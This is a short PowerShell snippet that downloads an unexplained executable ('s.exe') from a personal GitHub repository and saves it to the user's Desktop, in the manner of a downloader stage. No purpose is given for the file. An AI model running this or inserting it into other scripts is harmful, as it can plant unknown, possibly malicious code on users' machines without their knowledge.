$httpClient = New-Object System.Net.Http.HttpClient
$httpClient.GetAsync("https://raw.githubusercontent.com/guilegel4/server/refs/heads/main/s.exe").Result.Content.ReadAsByteArrayAsync().Result | Set-Content "$env:USERPROFILE\Desktop\s.exe" -Encoding Byte
